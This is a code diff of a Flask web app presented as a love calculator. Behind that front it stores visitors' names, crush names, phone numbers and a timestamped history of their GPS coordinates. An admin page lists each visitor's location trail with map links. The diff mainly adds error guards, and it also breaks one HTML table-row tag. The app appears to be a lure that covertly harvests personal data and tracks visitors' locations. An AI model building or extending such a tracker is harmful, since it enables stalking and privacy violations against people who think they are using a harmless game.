@@ -2,23 +2,26 @@ from flask import Flask, request, jsonify, render_template_string, Response
 from supabase import create_client, Client
 import os
 import random
+import sys
 from datetime import datetime
 
 app = Flask(__name__)
 
-# ---------- Supabase Setup – Read from Environment Variables ----------
+# ---------- Supabase Setup ----------
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
 if not SUPABASE_URL or not SUPABASE_KEY:
-    raise RuntimeError("Missing SUPABASE_URL or SUPABASE_KEY environment variables")
-
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+    print("ERROR: SUPABASE_URL or SUPABASE_KEY not set in environment", file=sys.stderr)
+else:
+    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"
 
-# ---------- Helper Functions (unchanged) ----------
+# ---------- Helper Functions ----------
 def save_visitor(data):
+    if 'supabase' not in globals():
+        return
     existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
     if existing.data:
         supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
@@ -26,6 +29,8 @@ def save_visitor(data):
         supabase.table("visitors").insert(data).execute()
 
 def save_location_update(session_id, lat, lon):
+    if 'supabase' not in globals():
+        return
     supabase.table("location_history").insert({
         "sessionId": session_id,
         "timestamp": datetime.now().isoformat(),
@@ -34,10 +39,14 @@ def save_location_update(session_id, lat, lon):
     }).execute()
 
 def get_location_history(session_id):
+    if 'supabase' not in globals():
+        return []
     res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
     return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
 
 def get_all_visitors():
+    if 'supabase' not in globals():
+        return []
     res = supabase.table("visitors").select("*").order("id", desc=True).execute()
     visitors = []
     for row in res.data:
@@ -45,7 +54,7 @@ def get_all_visitors():
         visitors.append(row)
     return visitors
 
-# ---------- Love Calculator (unchanged) ----------
+# ---------- Love Calculator ----------
 def calculate_love_percentage(name1, name2):
     combined = (name1 + name2).lower()
     total = sum(ord(c) for c in combined)
@@ -96,7 +105,7 @@ def index():
 def get_session_data_route():
     data = request.json
     session_id = data.get('sessionId')
-    if session_id:
+    if session_id and 'supabase' in globals():
         res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber").eq("sessionId", session_id).execute()
         if res.data:
             row = res.data[0]
@@ -141,7 +150,7 @@ def save_phone():
     session_id = data.get('sessionId')
     phone = data.get('phoneNumber')
     fortune_text = data.get('fortune')
-    if session_id:
+    if session_id and 'supabase' in globals():
         supabase.table("visitors").update({"phoneNumber": phone, "fortuneText": fortune_text}).eq("sessionId", session_id).execute()
         return jsonify({'status': 'saved'})
     return jsonify({'status': 'error'}), 400
@@ -180,7 +189,7 @@ def admin():
                 if hist:
                     html += f'<h3>Session: {v.get("sessionId", "Unknown")} – {v.get("name", "Anonymous")} (crush: {v.get("crush_name", "?")})</h3>'
                     html += '<table border="1" cellpadding="3" style="margin-bottom:20px;">'
-                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
+                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th><tr>'
                     for ts, lat, lon in hist:
                         map_link = f'https://www.google.com/maps?q={lat},{lon}'
                         html += f'<tr><td style="white-space:nowrap;">{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">View</a></td></tr>'
@@ -242,10 +251,7 @@ def calculate_love():
     message = get_love_message(name1, name2, percentage)
     return jsonify({'percentage': percentage, 'message': message})
 
-# ---------- HTML_TEMPLATE (full) – copy exactly from your original working code ----------
-# (I am including the full template that you had in your previous local version)
-# Since it's extremely long, I will paste the exact one you used earlier.
-# You already have it in your local files. Ensure it is placed here without truncation.
+# ---------- HTML_TEMPLATE (complete) ----------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
